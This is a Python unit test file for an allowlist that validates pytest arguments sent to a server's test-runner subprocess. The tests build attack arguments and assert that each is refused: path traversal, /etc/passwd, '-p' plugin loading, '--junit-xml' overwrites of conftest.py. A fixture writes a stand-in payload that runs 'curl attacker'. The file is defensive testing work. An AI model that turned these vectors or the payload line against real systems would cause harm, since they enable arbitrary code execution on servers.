"""
Unit tests for cosa.rest.pytest_args_policy — the allowlist that closes row 60f04102.

PROVE IT BY ATTACK, NOT BY INSPECTION. The row is explicit that a test asserting
the check EXISTS is weaker than one showing the REFUSAL, so every guard test here
constructs the actual malicious argument and asserts it is rejected.

THE VECTOR UNDER TEST, stated once: `subprocess.Popen` is called WITHOUT
shell=True (job.py:1184), so shell metacharacters are not the attack. pytest
IMPORTS whatever path it is asked to collect, so an arbitrary path is arbitrary
code execution as the server's OS user. The tests that matter are the path ones.

THE CONTROL MUST FAIL IN BOTH DIRECTIONS. A guard that refuses everything is as
broken as one that refuses nothing, so the legitimate-usage tests below are
taken from a census of real pytest_args found in the tree — if the allowlist
gets over-tightened, they go red first.
"""

import os

import pytest

from cosa.rest import pytest_args_policy as policy
from cosa.rest.pytest_args_policy import PytestArgsRejected, parse_and_validate, validate_pytest_args


# ---- Fixtures ---------------------------------------------------------------

@pytest.fixture
def project_root( tmp_path ):
    """A throwaway tree with the two real test roots, so nothing touches the repo."""
    for root in policy.ALLOWED_TEST_ROOTS:
        ( tmp_path / root ).mkdir( parents=True, exist_ok=True )
    ( tmp_path / "src" / "tests" / "unit" ).mkdir( parents=True, exist_ok=True )
    ( tmp_path / "src" / "tests" / "unit" / "test_real.py" ).write_text( "def test_x(): pass\n" )
    # A file OUTSIDE the allowed roots, standing in for /tmp/evil.py.
    ( tmp_path / "evil.py" ).write_text( "import os; os.system('curl attacker')\n" )
    return str( tmp_path )


# ---- THE ATTACKS ------------------------------------------------------------

def test_absolute_path_outside_test_roots_is_refused( project_root ):
    """The headline attack: hand pytest a file it will import. /tmp/evil.py."""
    evil = os.path.join( project_root, "evil.py" )
    with pytest.raises( PytestArgsRejected ) as caught:
        validate_pytest_args( [ evil ], project_root )
    assert "must resolve inside" in str( caught.value )


def test_traversal_out_of_the_test_root_is_refused( project_root ):
    """
    ../ traversal STARTING inside an allowed root. This is the test that proves
    resolution happens BEFORE the prefix check — a naive startswith() on the raw
    string would pass this, because it literally starts with "src/tests".
    """
    with pytest.raises( PytestArgsRejected ):
        validate_pytest_args( [ "src/tests/../../evil.py" ], project_root )


def test_absolute_system_path_is_refused( project_root ):
    with pytest.raises( PytestArgsRejected ):
        validate_pytest_args( [ "/etc/passwd" ], project_root )


def test_sibling_directory_with_shared_prefix_is_refused( tmp_path ):
    """
    "src/testsEVIL" shares a string prefix with "src/tests" and must NOT pass.
    This is the trailing-separator case in _path_is_confined; without it the
    guard is defeated by naming a directory carefully.
    """
    ( tmp_path / "src" / "tests" ).mkdir( parents=True )
    ( tmp_path / "src" / "testsEVIL" ).mkdir( parents=True )
    ( tmp_path / "src" / "testsEVIL" / "x.py" ).write_text( "" )
    with pytest.raises( PytestArgsRejected ):
        validate_pytest_args( [ "src/testsEVIL/x.py" ], str( tmp_path ) )


def test_plugin_load_flag_is_refused( project_root ):
    """
    🔴 THE HOLE THIS AUTHOR SHIPPED AND MARIA FOUND. `-p <module>` makes pytest
    IMPORT that module before collection. The value is a module NAME, not a path,
    so path confinement never touches it — `-p` sat in the allowlist as an
    ordinary value-flag and let arbitrary code execution walk through the guard.

    Proven live before this test was written: `pytest -p evil_plugin
    --collect-only` executed the module body and wrote a file as uid 1001.
    """
    for tokens in ( [ "-p", "evil_plugin" ], [ "-p=evil_plugin" ], [ "--plugin", "evil_plugin" ] ):
        with pytest.raises( PytestArgsRejected ) as caught:
            validate_pytest_args( tokens, project_root )
        assert "unrecognised" in str( caught.value )


def test_junit_xml_write_path_is_refused( project_root ):
    """
    The second of Maria's two. --junit-xml is a caller-controlled WRITE target.
    Confining it to the test roots would have LICENSED overwriting
    src/tests/conftest.py — which pytest imports on the next run — so the fix is
    to refuse it outright, not to confine it. The job appends its own at
    job.py:1180, after validation, so nothing legitimate loses anything.
    """
    for tokens in ( [ "--junit-xml", "src/tests/conftest.py" ],
                    [ "--junit-xml=src/tests/conftest.py" ],
                    [ "--junitxml=/tmp/anywhere.xml" ] ):
        with pytest.raises( PytestArgsRejected ) as caught:
            validate_pytest_args( tokens, project_root )
        assert "unrecognised" in str( caught.value )


def test_unrecognised_flag_is_refused( project_root ):
    """pytest -p lets you load a plugin module; an unknown flag must not slip through."""
    with pytest.raises( PytestArgsRejected ) as caught:
        validate_pytest_args( [ "--rootdir=/etc" ], project_root )
    assert "unrecognised" in str( caught.value )


def test_path_valued_flag_is_confined_too( project_root ):
    """
    --deselect and --ignore take paths; confining bare paths but not these is a gap.

    ⚠️ THE ASSERTION ON THE REASON IS LOAD-BEARING, not decoration. The first
    version of this test only asserted "it raises", and it passed against a
    policy where these two flags were unrecognised entirely — refused for the
    WRONG reason, while every legitimate --deselect / --ignore in the tree would
    have been refused too. A rejection test that does not pin the cause cannot
    tell a working guard from a broken allowlist.
    """
    evil = os.path.join( project_root, "evil.py" )

    with pytest.raises( PytestArgsRejected ) as caught:
        validate_pytest_args( [ "--deselect", evil ], project_root )
    assert "must resolve inside" in str( caught.value )

    with pytest.raises( PytestArgsRejected ) as caught:
        validate_pytest_args( [ f"--ignore={evil}" ], project_root )
    assert "must resolve inside" in str( caught.value )


def test_path_valued_flags_accept_a_confined_path( project_root ):
    """The other direction: a legitimate --deselect / --ignore must still work."""
    good = "src/tests/unit/test_real.py"
    validate_pytest_args( [ "--deselect", good ], project_root )
    validate_pytest_args( [ f"--ignore={good}" ], project_root )


def test_flag_value_consumed_as_pair_cannot_smuggle_a_path( project_root ):
    """
    `-k` takes a value, so the NEXT token is consumed as that value rather than
    validated as a path. That is correct — but it must not be exploitable by
    following it with a path, because the path lands after the pair completes.
    """
    evil = os.path.join( project_root, "evil.py" )
    with pytest.raises( PytestArgsRejected ):
        validate_pytest_args( [ "-k", "auth", evil ], project_root )


def test_dangling_value_flag_is_refused( project_root ):
    with pytest.raises( PytestArgsRejected ) as caught:
        validate_pytest_args( [ "-v", "-k" ], project_root )
    assert "missing its value" in str( caught.value )


def test_null_byte_is_refused( project_root ):
    with pytest.raises( PytestArgsRejected ):
        validate_pytest_args( [ "src/tests/unit/test_real.py\x00" ], project_root )


def test_arg_flood_is_refused( project_root ):
    with pytest.raises( PytestArgsRejected ) as caught:
        validate_pytest_args( [ "-v" ] * ( policy.MAX_ARG_COUNT + 1 ), project_root )
    assert "too many" in str( caught.value )


def test_overlong_arg_is_refused( project_root ):
    with pytest.raises( PytestArgsRejected ):
        validate_pytest_args( [ "-" + "x" * policy.MAX_ARG_LENGTH ], project_root )


def test_unbalanced_quotes_are_refused_at_parse( project_root ):
    with pytest.raises( PytestArgsRejected ) as caught:
        parse_and_validate( "-k 'unclosed", project_root )
    assert "could not parse" in str( caught.value )


# ---- THE OTHER DIRECTION: real usage must still pass ------------------------
# Every string below was taken from an actual pytest_args usage in the tree. If
# the allowlist is over-tightened, these go red before anything ships.

@pytest.mark.parametrize( "raw", [
    "-v",
    "-k doc_viewer_multi_repo",
    "-k 'doc_viewer_multi_repo and not Visual' -v",
    "-m paired_eval_live src/tests/integration/test_v2_paired_live.py -v",
    "--auto-proxy --cost-cap-usd 5.00",
    "-k multiplexer_phase6b --update-snapshots",
    "--include-opus",
    "--tb=short",
    "--maxfail=1",
    "-k presentation -v",
] )
def test_real_world_usages_still_pass( raw, project_root ):
    ( os.path.join( project_root, "src", "tests", "integration" ) )
    os.makedirs( os.path.join( project_root, "src", "tests", "integration" ), exist_ok=True )
    open( os.path.join( project_root, "src", "tests", "integration", "test_v2_paired_live.py" ), "w" ).close()
    assert parse_and_validate( raw, project_root ) == __import__( "shlex" ).split( raw )


def test_node_id_suffix_is_allowed( project_root ):
    """`path::Class::test` is ordinary pytest addressing; only the path half is a file."""
    parse_and_validate( "src/tests/unit/test_real.py::TestThing::test_x", project_root )


def test_empty_and_none_are_noops( project_root ):
    assert parse_and_validate( None, project_root )  == []
    assert parse_and_validate( "", project_root )    == []
    assert parse_and_validate( "   ", project_root ) == []


def test_bare_flag_given_a_value_is_refused( project_root ):
    with pytest.raises( PytestArgsRejected ) as caught:
        validate_pytest_args( [ "--auto-proxy=1" ], project_root )
    assert "takes no value" in str( caught.value )
